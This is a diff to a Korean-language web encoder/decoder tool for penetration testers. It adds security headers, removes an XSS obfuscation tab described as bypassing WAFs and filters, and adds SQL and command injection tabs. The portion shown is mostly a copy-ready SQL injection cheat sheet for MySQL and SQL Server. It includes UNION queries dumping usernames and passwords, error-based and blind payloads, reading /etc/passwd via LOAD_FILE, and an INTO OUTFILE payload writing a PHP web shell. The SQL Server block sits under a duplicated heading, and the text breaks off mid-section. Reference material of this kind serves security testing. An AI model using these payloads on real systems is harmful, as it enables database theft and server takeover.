@@ -3,8 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-JHa5DcRot4GaiOoAgDYYcg'; style-src 'self' 'nonce-JHa5DcRot4GaiOoAgDYYcg'; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="Referrer-Policy" content="no-referrer">
+    <meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
     <title>Encoder/Decoder Tool</title>
-    <style>
+    <style nonce="JHa5DcRot4GaiOoAgDYYcg">
         :root {
             --color-white: rgba(255, 255, 255, 1);
             --color-black: rgba(0, 0, 0, 1);
@@ -541,6 +547,75 @@
                 width: 100%;
             }
         }
+    
+        /* Cheat Sheet Styles */
+        .cheat-category {
+            margin-bottom: 32px;
+        }
+
+        .cheat-section {
+            margin-bottom: 20px;
+        }
+
+        .cheat-section h4 {
+            margin: 12px 0 8px 0;
+            color: var(--color-text-secondary);
+            font-size: 14px;
+            font-weight: var(--font-weight-semibold);
+        }
+
+        .cheat-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            background: var(--color-surface);
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-base);
+            margin-bottom: 8px;
+        }
+
+        .cheat-label {
+            min-width: 160px;
+            font-weight: var(--font-weight-medium);
+            color: var(--color-text);
+            font-size: var(--font-size-sm);
+        }
+
+        .cheat-code {
+            flex: 1;
+            font-family: var(--font-family-mono);
+            font-size: var(--font-size-sm);
+            background: var(--color-background);
+            padding: 8px 12px;
+            border-radius: var(--radius-base);
+            color: var(--color-primary);
+            word-break: break-all;
+            user-select: all;
+        }
+
+        .btn-sm {
+            padding: 6px 12px;
+            font-size: var(--font-size-sm);
+            min-width: 50px;
+        }
+
+        @media (max-width: 768px) {
+            .cheat-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .cheat-label {
+                min-width: auto;
+                width: 100%;
+            }
+
+            .btn-sm {
+                width: 100%;
+            }
+        }
+
     </style>
 </head>
 <body>
@@ -555,10 +630,13 @@
                 <button class="tab" data-tab="html">HTML</button>
                 <button class="tab" data-tab="hex">Hex</button>
                 <button class="tab" data-tab="unicode">Unicode</button>
-                <button class="tab" data-tab="xss">XSS Tools</button>
+                
                 <button class="tab" data-tab="jwt">JWT</button>
                 <button class="tab" data-tab="hash">Hash</button>
                 <button class="tab" data-tab="smart">Smart Detect</button>
+                <button class="tab" data-tab="sqli">SQL Injection</button>
+                <button class="tab" data-tab="cmdi">Command Injection</button>
+                                                <button class="tab" data-tab="json">JSON Formatter</button>
                 <button class="tab" data-tab="presets">Presets</button>
             </div>
 
@@ -577,24 +655,24 @@
                         <label for="base64-input">입력</label>
                         <textarea id="base64-input" placeholder="인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('base64-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('base64-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('base64-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="base64-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="autoConvertBase64()">🔄 자동 변환</button>
-                        <button class="btn btn-secondary" onclick="encodeBase64()">→ 인코딩</button>
-                        <button class="btn btn-secondary" onclick="decodeBase64()">← 디코딩</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('base64-input', 'base64-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="autoConvertBase64">🔄 자동 변환</button>
+                        <button class="btn btn-secondary" data-action="encodeBase64">→ 인코딩</button>
+                        <button class="btn btn-secondary" data-action="decodeBase64">← 디코딩</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="base64-input" data-output="base64-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="base64-output">출력</label>
                         <textarea id="base64-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('base64-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('base64-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('base64-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="base64-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
@@ -616,24 +694,24 @@
                         <label for="url-input">입력</label>
                         <textarea id="url-input" placeholder="URL 인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('url-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('url-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('url-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="url-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="autoConvertURL()">🔄 자동 변환</button>
-                        <button class="btn btn-secondary" onclick="encodeURL()">→ 인코딩</button>
-                        <button class="btn btn-secondary" onclick="decodeURL()">← 디코딩</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('url-input', 'url-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="autoConvertURL">🔄 자동 변환</button>
+                        <button class="btn btn-secondary" data-action="encodeURL">→ 인코딩</button>
+                        <button class="btn btn-secondary" data-action="decodeURL">← 디코딩</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="url-input" data-output="url-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="url-output">출력</label>
                         <textarea id="url-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('url-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('url-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('url-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="url-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
@@ -643,7 +721,7 @@
             <!-- Double URL Encoding Tab -->
             <div class="tab-content" id="double-url">
                 <div class="info-box">
-                    <strong>💡 Double URL Encoding:</strong> WAF 우회에 사용되는 기법으로, % 문자를 %25로 인코딩합니다. 
+                    <strong>💡 Double URL Encoding:</strong> % 문자를 %25로 인코딩하는 기법입니다. 
                     예: &lt; → %3C → %253C
                 </div>
 
@@ -652,23 +730,23 @@
                         <label for="double-url-input">입력</label>
                         <textarea id="double-url-input" placeholder="Double URL 인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('double-url-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('double-url-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('double-url-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="double-url-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="encodeDoubleURL()">→ Double Encode</button>
-                        <button class="btn btn-secondary" onclick="decodeDoubleURL()">← Double Decode</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('double-url-input', 'double-url-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="encodeDoubleURL">→ Double Encode</button>
+                        <button class="btn btn-secondary" data-action="decodeDoubleURL">← Double Decode</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="double-url-input" data-output="double-url-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="double-url-output">출력</label>
                         <textarea id="double-url-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('double-url-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('double-url-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('double-url-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="double-url-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
@@ -700,24 +778,24 @@
                         <label for="html-input">입력</label>
                         <textarea id="html-input" placeholder="HTML 인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('html-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('html-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('html-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="html-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="autoConvertHTML()">🔄 자동 변환</button>
-                        <button class="btn btn-secondary" onclick="encodeHTML()">→ 인코딩</button>
-                        <button class="btn btn-secondary" onclick="decodeHTML()">← 디코딩</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('html-input', 'html-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="autoConvertHTML">🔄 자동 변환</button>
+                        <button class="btn btn-secondary" data-action="encodeHTML">→ 인코딩</button>
+                        <button class="btn btn-secondary" data-action="decodeHTML">← 디코딩</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="html-input" data-output="html-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="html-output">출력</label>
                         <textarea id="html-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('html-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('html-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('html-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="html-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
@@ -739,24 +817,24 @@
                         <label for="hex-input">입력</label>
                         <textarea id="hex-input" placeholder="Hex 인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('hex-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('hex-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('hex-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="hex-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="autoConvertHex()">🔄 자동 변환</button>
-                        <button class="btn btn-secondary" onclick="encodeHex()">→ 인코딩</button>
-                        <button class="btn btn-secondary" onclick="decodeHex()">← 디코딩</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('hex-input', 'hex-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="autoConvertHex">🔄 자동 변환</button>
+                        <button class="btn btn-secondary" data-action="encodeHex">→ 인코딩</button>
+                        <button class="btn btn-secondary" data-action="decodeHex">← 디코딩</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="hex-input" data-output="hex-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="hex-output">출력</label>
                         <textarea id="hex-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('hex-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('hex-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('hex-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="hex-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
@@ -778,67 +856,1025 @@
                         <label for="unicode-input">입력</label>
                         <textarea id="unicode-input" placeholder="Unicode 인코딩/디코딩할 텍스트를 입력하세요..."></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('unicode-input')">🗑️ 입력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('unicode-input')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('unicode-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="unicode-input">📋 복사</button>
                         </div>
                     </div>
 
                     <div class="middle-actions">
-                        <button class="btn btn-primary" onclick="autoConvertUnicode()">🔄 자동 변환</button>
-                        <button class="btn btn-secondary" onclick="encodeUnicode()">→ 인코딩</button>
-                        <button class="btn btn-secondary" onclick="decodeUnicode()">← 디코딩</button>
-                        <button class="btn btn-secondary btn-icon" onclick="swapText('unicode-input', 'unicode-output')" title="입출력 교환">⇄</button>
+                        <button class="btn btn-primary" data-action="autoConvertUnicode">🔄 자동 변환</button>
+                        <button class="btn btn-secondary" data-action="encodeUnicode">→ 인코딩</button>
+                        <button class="btn btn-secondary" data-action="decodeUnicode">← 디코딩</button>
+                        <button class="btn btn-secondary btn-icon" data-action="swap" data-input="unicode-input" data-output="unicode-output" title="입출력 교환">⇄</button>
                     </div>
 
                     <div class="panel">
                         <label for="unicode-output">출력</label>
                         <textarea id="unicode-output" placeholder="변환 결과가 여기에 표시됩니다..." readonly></textarea>
                         <div class="button-group">
-                            <button class="btn btn-secondary" onclick="clearText('unicode-output')">🗑️ 출력 초기화</button>
-                            <button class="btn btn-secondary" onclick="copyText('unicode-output')">📋 복사</button>
+                            <button class="btn btn-secondary" data-onclick="clearText('unicode-output')">🗑️ 출력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="unicode-output">📋 복사</button>
                         </div>
                     </div>
                 </div>
                 <div id="unicode-message" class="message"></div>
             </div>
 
-            <!-- XSS Tools Tab -->
-            <div class="tab-content" id="xss">
+            
+
+            
+                        <!-- SQL Injection Cheat Sheet Tab -->
+            <div class="tab-content" id="sqli">
                 <div class="info-box">
-                    <strong>🛡️ XSS 난독화 도구:</strong> JavaScript 문자열을 다양한 방식으로 인코딩하여 WAF/필터를 우회합니다.
+                    <strong>💉 SQL Injection Cheat Sheet:</strong> DBMS별 SQL Injection 페이로드 및 유용한 함수 모음입니다.
                 </div>
 
-                <div class="panel">
-                    <label for="xss-input">입력 텍스트</label>
-                    <textarea id="xss-input" placeholder="난독화할 JavaScript 코드를 입력하세요... (예: alert(1))"></textarea>
-
-                    <label for="xss-method">난독화 방식 선택</label>
-                    <select id="xss-method">
-                        <option value="hex">Hex Encoding (\x41\x6c\x65\x72\x74)</option>
-                        <option value="unicode">Unicode Escape (\u0061\u006c\u0065\u0072\u0074)</option>
-                        <option value="octal">Octal Encoding (\141\154\145\162\164)</option>
-                        <option value="char">String.fromCharCode(97,108,...)</option>
-                        <option value="html-entity-decimal">HTML Entity Decimal (&#97;&#108;...)</option>
-                        <option value="html-entity-hex">HTML Entity Hex (&#x61;&#x6c;...)</option>
-                        <option value="concat">String Concatenation ('al'+'ert')</option>
-                        <option value="eval-base64">eval(atob('base64'))</option>
+                <div style="margin-bottom: 16px;">
+                    <label for="sqli-filter">DBMS 필터</label>
+                    <select id="sqli-filter" onchange="filterSQLi()" style="width: 100%; padding: 8px; border: 1px solid var(--color-border); border-radius: var(--radius-base); background: var(--color-background); color: var(--color-text);">
+                        <option value="all">전체 보기</option>
+                        <option value="mysql">MySQL / MariaDB</option>
+                        <option value="mssql">Microsoft SQL Server</option>
+                        <option value="oracle">Oracle</option>
+                        <option value="postgresql">PostgreSQL</option>
+                        <option value="sqlite">SQLite</option>
                     </select>
-
-                    <div class="button-group">
-                        <button class="btn btn-primary" onclick="obfuscateXSS()">🔀 난독화 실행</button>
-                        <button class="btn btn-secondary" onclick="clearText('xss-input')">🗑️ 초기화</button>
-                    </div>
                 </div>
 
-                <div class="panel">
-                    <label for="xss-output">난독화 결과</label>
-                    <textarea id="xss-output" placeholder="난독화된 결과가 여기에 표시됩니다..." readonly></textarea>
-                    <div class="button-group">
-                        <button class="btn btn-secondary" onclick="copyText('xss-output')">📋 복사</button>
+                <div id="sqli-cheatsheet">
+
+                    <!-- MySQL / MariaDB -->
+                    <div class="cheat-category" data-dbms="mysql">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            🐬 MySQL / MariaDB
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>기본 정보 수집</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">버전 확인</div>
+                                <code class="cheat-code">SELECT @@version</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 사용자</div>
+                                <code class="cheat-code">SELECT user()</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 DB</div>
+                                <code class="cheat-code">SELECT database()</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">모든 DB 목록</div>
+                                <code class="cheat-code">SELECT schema_name FROM information_schema.schemata</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>UNION-based Injection</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">컬럼 수 확인</div>
+                                <code class="cheat-code">' ORDER BY 1-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">UNION SELECT</div>
+                                <code class="cheat-code">' UNION SELECT NULL,NULL,NULL-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">테이블 목록</div>
+                                <code class="cheat-code">' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">컬럼 목록</div>
+                                <code class="cheat-code">' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">데이터 추출</div>
+                                <code class="cheat-code">' UNION SELECT username,password FROM users-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">GROUP_CONCAT 사용</div>
+                                <code class="cheat-code">' UNION SELECT GROUP_CONCAT(username,':',password),NULL FROM users-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Error-based Injection</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">ExtractValue</div>
+                                <code class="cheat-code">' AND extractvalue(1,concat(0x7e,(SELECT user())))-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">UpdateXML</div>
+                                <code class="cheat-code">' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Double Query</div>
+                                <code class="cheat-code">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Blind SQL Injection (Boolean)</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">참/거짓 테스트</div>
+                                <code class="cheat-code">' AND 1=1-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">SUBSTRING 문자 추출</div>
+                                <code class="cheat-code">' AND SUBSTRING(database(),1,1)='a'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">ASCII 값 비교</div>
+                                <code class="cheat-code">' AND ASCII(SUBSTRING(database(),1,1))>97-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Time-based Blind</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">SLEEP</div>
+                                <code class="cheat-code">' AND SLEEP(5)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">조건부 SLEEP</div>
+                                <code class="cheat-code">' AND IF(1=1,SLEEP(5),0)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">BENCHMARK</div>
+                                <code class="cheat-code">' AND BENCHMARK(10000000,MD5('test'))-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>유용한 함수</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">CONCAT</div>
+                                <code class="cheat-code">SELECT CONCAT(username,':',password) FROM users</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LENGTH</div>
+                                <code class="cheat-code">SELECT LENGTH(database())</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LIMIT로 행 선택</div>
+                                <code class="cheat-code">SELECT username FROM users LIMIT 0,1</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LOAD_FILE (파일 읽기)</div>
+                                <code class="cheat-code">' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">INTO OUTFILE (파일 쓰기)</div>
+                                <code class="cheat-code">' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;',NULL INTO OUTFILE '/var/www/html/shell.php'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>기본 정보 수집</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">버전 정보</div>
+                        <code class="cheat-code">SELECT @@version</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
                     </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">현재 사용자</div>
+                        <code class="cheat-code">SELECT SYSTEM_USER</code>
+                        <code class="cheat-code">SELECT USER_NAME()</code>
+                        <code class="cheat-code">SELECT CURRENT_USER</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">현재 DB</div>
+                        <code class="cheat-code">SELECT DB_NAME()</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">모든 DB 목록</div>
+                        <code class="cheat-code">SELECT name FROM master.dbo.sysdatabases</code>
+                        <code class="cheat-code">SELECT name FROM sys.databases</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">호스트 정보</div>
+                        <code class="cheat-code">SELECT @@servername</code>
+                        <code class="cheat-code">SELECT HOST_NAME()</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">현재 권한 확인</div>
+                        <code class="cheat-code">SELECT IS_SRVROLEMEMBER('sysadmin')</code>
+                        <code class="cheat-code">SELECT IS_MEMBER('db_owner')</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>UNION-based Injection</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">컬럼 수 확인</div>
+                        <code class="cheat-code">' ORDER BY 1-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">UNION SELECT</div>
+                        <code class="cheat-code">' UNION SELECT NULL,NULL,NULL-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">테이블 목록 (구버전)</div>
+                        <code class="cheat-code">' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">테이블 목록 (신버전)</div>
+                        <code class="cheat-code">' UNION SELECT table_name,NULL FROM information_schema.tables-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">컬럼 목록</div>
+                        <code class="cheat-code">' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">데이터 추출</div>
+                        <code class="cheat-code">' UNION SELECT username,password FROM users-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">STRING_AGG로 결합 (SQL Server 2017+)</div>
+                        <code class="cheat-code">' UNION SELECT STRING_AGG(username+':'+password, ','),NULL FROM users-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>Error-based Injection</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">CONVERT 오류</div>
+                        <code class="cheat-code">' AND 1=CONVERT(int,(SELECT @@version))-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">CAST 오류</div>
+                        <code class="cheat-code">' AND 1=CAST((SELECT DB_NAME()) AS int)-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">Division by Zero</div>
+                        <code class="cheat-code">' AND 1/(SELECT CASE WHEN (1=1) THEN 0 ELSE 1 END)=1-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>Boolean-based Blind</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">참/거짓 테스트</div>
+                        <code class="cheat-code">' AND 1=1-- </code>
+                        <code class="cheat-code">' AND 'a'='a'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">SUBSTRING 문자 추출</div>
+                        <code class="cheat-code">' AND SUBSTRING(DB_NAME(),1,1)='m'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">ASCII 값 비교</div>
+                        <code class="cheat-code">' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>Time-based Blind</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">WAITFOR DELAY</div>
+                        <code class="cheat-code">'; WAITFOR DELAY '00:00:05'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">조건부 WAITFOR</div>
+                        <code class="cheat-code">'; IF(1=1) WAITFOR DELAY '00:00:05'-- </code>
+                        <code class="cheat-code">'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>100) WAITFOR DELAY '00:00:05'-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>Stacked Queries</h4>
+                    <div class="cheat-item">
